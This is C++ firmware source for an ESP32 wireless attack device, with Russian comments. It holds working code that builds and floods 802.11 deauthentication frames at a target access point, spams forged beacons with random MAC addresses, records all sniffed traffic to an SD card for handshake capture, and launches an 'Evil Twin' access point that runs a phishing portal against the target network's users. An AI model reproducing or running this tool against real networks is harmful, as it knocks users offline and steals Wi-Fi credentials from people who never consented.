#include "WiFiManager.h" 
#include "SdManager.h"
#include "WebPortalManager.h" 
#include "Config.h"
#include <esp_wifi.h>

static WiFiAttackManager* g_wifiManager = nullptr;

WiFiAttackManager::WiFiAttackManager() : 
    _state(WiFiState::IDLE), 
    _lastPacketTime(0), 
    _packetsSent(0), 
    _capturedHandshake(false) 
{
    g_wifiManager = this; 
    memset(_packetBuffer, 0, 128);
}

void WiFiAttackManager::setup() { 
    WiFi.mode(WIFI_STA); 
    WiFi.disconnect(); 
    esp_wifi_set_ps(WIFI_PS_NONE); // Максимальная производительность для атак
}

void WiFiAttackManager::stop() {
    // Останавливаем захват пакетов на SD
    SdManager::getInstance().stopCapture();
    
    // Останавливаем веб-портал, если был запущен
    if (WebPortalManager::getInstance().isRunning()) {
        WebPortalManager::getInstance().stop();
    }
    
    // FIX v5.5: Явный сброс состояния, чтобы UI не показывал старые данные
    _state = WiFiState::IDLE;
    
    // Отключаем сниффер и сбрасываем WiFi
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
}

void WiFiAttackManager::startScan() {
    if (_state != WiFiState::IDLE) return;
    
    // Асинхронный запуск сканирования
    WiFi.scanNetworks(true); 
    _state = WiFiState::SCANNING;
}

void WiFiAttackManager::startDeauth(const TargetAP& target) {
    _currentTarget = target; 
    _packetsSent = 0; 
    _capturedHandshake = false;
    
    // Начинаем запись PCAP файла
    SdManager::getInstance().startCapture();
    
    // Настройка WiFi в режим инъекций
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_currentTarget.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&WiFiAttackManager::snifferHandler);
    
    buildDeauthPacket();
    _state = WiFiState::ATTACKING_DEAUTH;
}

void WiFiAttackManager::startBeaconSpam() { 
    _packetsSent = 0; 
    esp_wifi_set_promiscuous(true); 
    _state = WiFiState::ATTACKING_BEACON; 
}

void WiFiAttackManager::startEvilTwin(const TargetAP& target) {
    _currentTarget = target; 
    _state = WiFiState::ATTACKING_EVIL_TWIN;
    
    // Для Evil Twin нужен режим AP, поэтому отключаем промитскуитет
    esp_wifi_set_promiscuous(false);
    WebPortalManager::getInstance().start(target.ssid);
}

void WiFiAttackManager::buildDeauthPacket() {
    // Формирование стандартного 802.11 Deauth фрейма (Reason Code: 1 - Unspecified)
    memset(_packetBuffer, 0, 26);
    _packetBuffer[0] = 0xC0; _packetBuffer[1] = 0x00; // Type: Management, Subtype: Deauthentication
    _packetBuffer[2] = 0x3A; _packetBuffer[3] = 0x01; // Duration
    memset(&_packetBuffer[4], 0xFF, 6);               // Destination: Broadcast (FF:FF:FF:FF:FF:FF)
    memcpy(&_packetBuffer[10], _currentTarget.bssid, 6); // Source: AP BSSID
    memcpy(&_packetBuffer[16], _currentTarget.bssid, 6); // BSSID: AP BSSID
    _packetBuffer[24] = 0x00; _packetBuffer[25] = 0x00; // Sequence number
}

void WiFiAttackManager::buildBeaconPacket(const char* ssid) {
    int len = strlen(ssid); 
    if (len > 32) len = 32;
    
    memset(_packetBuffer, 0, 128);
    _packetBuffer[0] = 0x80; _packetBuffer[1] = 0x00; // Type: Management, Subtype: Beacon
    memset(&_packetBuffer[4], 0xFF, 6);               // Destination: Broadcast
    
    // Fake Source MAC (Randomized)
    for(int i=10;i<16;i++) _packetBuffer[i] = random(0,255);
    memcpy(&_packetBuffer[16], &_packetBuffer[10], 6); // BSSID = Source
    
    // Fixed Parameters (Timestamp, Interval, CapInfo)
    _packetBuffer[32] = 0x64; _packetBuffer[33] = 0x00; 
    _packetBuffer[34] = 0x01; _packetBuffer[35] = 0x00;
    
    // Tagged Parameters: SSID
    _packetBuffer[36] = 0x00; _packetBuffer[37] = len;
    memcpy(&_packetBuffer[38], ssid, len);
    
    // Tagged Parameters: Rates, DS Set, etc. (Simplified)
    _packetBuffer[38 + len] = 0x01;
    _packetBuffer[39 + len] = 0x08;
    _packetBuffer[40 + len] = 0x82; _packetBuffer[41 + len] = 0x84;
    _packetBuffer[42 + len] = 0x8b; _packetBuffer[43 + len] = 0x96;
    _packetBuffer[44 + len] = 0x24; _packetBuffer[45 + len] = 0x30;
    _packetBuffer[46 + len] = 0x48; _packetBuffer[47 + len] = 0x6c;
    
    _packetBuffer[48 + len] = 0x03;
    _packetBuffer[49 + len] = 0x01;
    _packetBuffer[50 + len] = random(1, 12); // Channel
}

void IRAM_ATTR WiFiAttackManager::snifferHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    // Проверка длины пакета и запись в очередь SD
    if (pkt->rx_ctrl.sig_len < 10 || pkt->rx_ctrl.sig_len > Config::MAX_PACKET_LEN) return;
    
    // В реальной версии тут можно добавить проверку на EAPOL Handshake (0x888E)
    // Для скорости мы пишем все подряд, фильтрация будет в Wireshark
    SdManager::getInstance().enqueuePacketFromISR(pkt->payload, pkt->rx_ctrl.sig_len);
}

bool WiFiAttackManager::loop(StatusMessage& statusOut) {
    uint32_t now = millis();
    statusOut.handshakeCaptured = _capturedHandshake;

    // --- EVIL TWIN MODE ---
    if (_state == WiFiState::ATTACKING_EVIL_TWIN) {
        WebPortalManager::getInstance().processDns();
        statusOut.state = SystemState::ATTACKING_EVIL_TWIN;
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Phishing: %s", _currentTarget.ssid);
        // Небольшая задержка, чтобы не вешать CPU в цикле
        vTaskDelay(pdMS_TO_TICKS(5));
        return true; 
    }

    // --- SCANNING MODE ---
    if (_state == WiFiState::SCANNING) {
        statusOut.state = SystemState::SCANNING;
        int n = WiFi.scanComplete();
        if (n >= 0) { 
            _state = WiFiState::SCAN_COMPLETE; 
            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Found: %d", n); 
        }
        else if (n == -2) {
            // Скан не удался или таймаут, пробуем снова
            WiFi.scanNetworks(true); 
        }
        else {
            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scanning...");
        }
        return true;
    }
    
    if (_state == WiFiState::SCAN_COMPLETE) { 
        statusOut.state = SystemState::SCAN_COMPLETE; 
        return false; // Возвращаем false, чтобы SystemController знал, что активная задача (скан) завершена
    }

    // --- DEAUTH ATTACK ---
    if (_state == WiFiState::ATTACKING_DEAUTH) {
        statusOut.state = SystemState::ATTACKING_WIFI_DEAUTH; 
        
        // Отправка пакетов пачками каждые 10мс (flood)
        if (now - _lastPacketTime > 10) {
            for(int i=0; i<3; i++) { 
                esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 26, false); 
                _packetsSent++; 
            }
            _lastPacketTime = now;
        }
        statusOut.packetsSent = _packetsSent;
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Deauthing...");
        return true;
    }

    // --- BEACON SPAM ---
    if (_state == WiFiState::ATTACKING_BEACON) {
        statusOut.state = SystemState::ATTACKING_WIFI_SPAM; 
        
        // Смена SSID и отправка каждые 50мс
        if (now - _lastPacketTime > 50) {
            const char* ssid = _spamSSIDs[random(0, _spamSSIDs.size())];
            buildBeaconPacket(ssid);
            // Длина пакета динамическая: 51 байт (база) + длина SSID
            int pktLen = 51 + strlen(ssid);
            esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, pktLen, false); 
            _packetsSent++;
            _lastPacketTime = now;
        }
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Beacon Spam");
        return true;
    }

    return false;
}

std::vector<TargetAP> WiFiAttackManager::getScanResults() {
    std::vector<TargetAP> results;
    int n = WiFi.scanComplete();
    if (n > 0) {
        // Ограничиваем список до 30 сетей для экономии памяти
        for (int i = 0; i < min(n, 30); ++i) {
            TargetAP ap;
            strncpy(ap.ssid, WiFi.SSID(i).c_str(), 32); 
            ap.ssid[32] = 0; // Гарантируем терминатор
            memcpy(ap.bssid, WiFi.BSSID(i), 6);
            ap.channel = WiFi.channel(i); 
            ap.rssi = WiFi.RSSI(i);
            results.push_back(ap);
        }
    }
    return results;
}